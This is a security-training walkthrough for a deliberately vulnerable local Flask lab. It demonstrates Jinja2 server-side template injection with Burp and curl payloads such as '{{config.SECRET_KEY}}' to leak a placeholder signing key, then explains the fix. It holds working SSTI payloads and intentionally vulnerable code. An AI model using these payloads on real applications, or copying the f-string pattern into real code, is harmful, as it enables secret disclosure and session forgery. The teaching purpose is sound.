# Walkthrough — ssti-jinja

The app builds a personalized greeting: you send a `name` and it replies `Hello, <name>!`. Under the hood it sews your `name` into the text of the template that renders the reply. Because **Jinja2** — Flask's template engine, the component that turns a template into HTML — *compiles* the text it is handed, your `name` is not treated as a value: it is treated as template code. Send `{{7*7}}` and the reply is `Hello, 49!` — the engine evaluated the expression. This is **Server-Side Template Injection (SSTI)**, and from that same foothold you will read the app's own configuration, including the `SECRET_KEY` that signs its sessions.

## 1. Context

On `/` you get a form with a single `name` field. Submitting it sends `GET /greet?name=<name>`; the server renders `Hello, <name>!` and returns it. That is the whole feature.

This is A03 — Injection: untrusted input reaches an engine — here the template engine — that interprets it with too much power. There is no database and no second service, just the `vulnerable` app on `127.0.0.1:8019` and the `fixed` app on `127.0.0.1:8119`. The exploration is done entirely in Burp.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/greet` view builds its reply like this:

```python
name = request.args.get("name", "world")
# VULNERABLE: the name is concatenated INTO the template source with an f-string
return render_template_string(
    "<!doctype html><title>Greeting</title>"
    "<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>"
    f"<h1>Hello, {name}!</h1>"                        # name is IN the template source -> SSTI
    '<p><a href="/">&larr; Back</a></p>'
)
```

`render_template_string` renders a **string** as a Jinja2 template. The f-string pastes `name` into that string *before* Jinja2 sees it, so your `name` becomes part of the template source — not a value handed to it. Whatever you send is compiled as template code. Audit question: *my `name` is part of the text the engine compiles — so a `{{ ... }}` expression I send will be evaluated?* — yes. The fix (foreshadowed): pass `name` as data, kept out of the source.

## 3. Exploitation via Burp Suite

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8019/>, submit the form once to capture the traffic, then right-click the `GET /greet?name=Ada` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### A note on URL encoding

The payloads use `{` and `}`, which aren't legal raw in a URL. URL-encode the `name` **value** before sending: `{` → `%7B`, `}` → `%7D`. The easy way in Repeater: paste the decoded payload after `name=`, select it, and press **Ctrl+U** — Burp encodes the selection (it also encodes `*`, `[`, `]`, and quotes; all harmless). Each step below shows the **payload decoded** (for reading) and the **request line** ready to paste.

The equivalent with curl, which URL-encodes the value for you:

```bash
curl -G http://127.0.0.1:8019/greet --data-urlencode 'name=<payload>'
```

### Step 1 — Baseline: the feature works

Payload:

```
Ada
```

Request line in Repeater:

```
GET /greet?name=Ada HTTP/1.1
Host: 127.0.0.1:8019
```

Response:

```html
<!doctype html><title>Greeting</title><p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p><h1>Hello, Ada!</h1><p><a href="/">&larr; Back</a></p>
```

The greeting works as intended. From here on, only the `<h1>` line changes, so the steps below show just that line.

### Step 2 — Confirm the injection

Payload:

```
{{7*7}}
```

Request line in Repeater:

```
GET /greet?name=%7B%7B7*7%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Response:

```html
<h1>Hello, 49!</h1>
```

The engine evaluated `7*7`. If your input were treated as data you would see `Hello, {{7*7}}!` literally — instead you got `49`. That is the proof that your input became template code, not a value. `{{7*7}}` is the classic SSTI probe: a harmless arithmetic expression that only produces `49` if something is evaluating it.

### Step 3 — Read the config and the SECRET_KEY (climax)

Flask puts a `config` object into **every** template context by default — the app never has to pass it. Since your input *is* template code, ask the engine to render `config`:

Payload:

```
{{config}}
```

Request line in Repeater:

```
GET /greet?name=%7B%7Bconfig%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Response (abbreviated — the whole Flask config comes back, with the signing key in the middle):

```html
<h1>Hello, &lt;Config {&#39;DEBUG&#39;: False, ... &#39;SECRET_KEY&#39;: &#39;dev-secret-CHANGEME-not-a-real-secret&#39;, ... &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;!</h1>
```

The angle brackets and quotes come back HTML-escaped (`&lt;`, `&#39;`) — Jinja2 autoescapes the *rendered output* — but the value is fully disclosed: a browser shows `<Config {... 'SECRET_KEY': 'dev-secret-CHANGEME-not-a-real-secret', ...}>`. Escaping the display characters does not stop the disclosure; the engine still read the object and handed it back.

Go straight for the key — `config` is a dict, so index it:

Payload:

```
{{config.SECRET_KEY}}
```

(`{{config['SECRET_KEY']}}` is equivalent; the attribute form just avoids brackets and quotes in the URL.)

Request line in Repeater:

```
GET /greet?name=%7B%7Bconfig.SECRET_KEY%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Response:

```html
<h1>Hello, dev-secret-CHANGEME-not-a-real-secret!</h1>
```

You have the app's `SECRET_KEY` — the key Flask uses to sign session cookies. (The value here is an obviously fake lab placeholder, not a real secret.) From this same expression foothold the SSTI class can escalate further, reaching command execution through Python's object hierarchy — but this atom stops at reading the config.

## 4. What the vuln is NOT

The exploit is an expression the engine runs, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT "using Jinja2 / rendering templates".** Every Flask app renders Jinja2 templates. **Proof:** send `name=Ada` to the vulnerable app **and** to the fixed app — both return exactly `Hello, Ada!`. The greeting logic is identical. Only `{{7*7}}` / `{{config}}` separate them. The difference is *where the input goes*, not "using templates".
- **It is NOT "`render_template_string` is the dangerous function".** The fixed app calls the **same** function — safely — by passing the name as data (`render_template_string("...{{ name }}...", name=name)`). The bug is *sewing* the input into the source with the f-string, not the function call. See [`DIFF.md`](./DIFF.md).
- **It is NOT (only) XSS.** Sewing the input into the source also emits raw HTML — a `name` of `<b>x</b>` renders as bold — which is reflected cross-site scripting (XSS), a different class covered by `xss-reflected`. The lesson *here* is **evaluation**: the engine computes `7*7` and reads `config`, which raw HTML reflection cannot do.
- **It is NOT remote code execution (in this atom).** The SSTI class can escalate from evaluating an expression to executing commands via Python's object hierarchy; this atom stops at reading `config` / the `SECRET_KEY` — a straight secret disclosure.

The one thing it **is**: the template engine evaluates an expression *you* inject, because your input is part of the template source, and hands you the result. The only fix is to keep the input **out** of the source — pass it as data.

## 5. Impact

**Secret disclosure, escalating to forged sessions.** The attacker makes the engine evaluate `{{config}}` and reads Flask's `SECRET_KEY` — the key that signs session cookies. With that key an attacker can forge or tamper with session cookies (impersonate any user, flip an `admin` flag), so the finding is disclosure with a direct path to account takeover through a forged session. It is **not** remote code execution by itself in this atom: SSTI as a class can reach code execution, but here the payload reads configuration. No overclaim.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed `/greet` passes the name as **data** instead of sewing it into the source:

```python
return render_template_string(
    "<!doctype html><title>Greeting</title>"
    "<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>"
    "<h1>Hello, {{ name }}!</h1>"                     # {{ name }} placeholder filled from data
    '<p><a href="/">&larr; Back</a></p>',
    name=name,                                        # name passed as DATA, never sewn in
)
```

Now `{{ name }}` is a placeholder written by the developer, and `name=name` fills it with the value. Jinja2 escapes that value and never re-evaluates it. Replay Steps 2 and 3 against <http://127.0.0.1:8119/greet>:

```html
<h1>Hello, {{7*7}}!</h1>
```

```html
<h1>Hello, {{config}}!</h1>
```

Both come back **literal** — the engine did not evaluate them, and the `SECRET_KEY` never leaks. The benign `name=Ada` still greets as `Hello, Ada!`, so the feature is intact; only the evaluation is gone. The whole fix is passing the name as data rather than splicing it into the template source. Note the fix is *structural* — keep input out of the template — not a blocklist of `{{`/`}}`, which would be a filter to bypass. Nor is a sandbox the answer: Jinja2 ships a `SandboxedEnvironment` that tries to *contain* what an expression can do, but it is a weaker, historically bypassed defense — the real fix is to not inject in the first place.
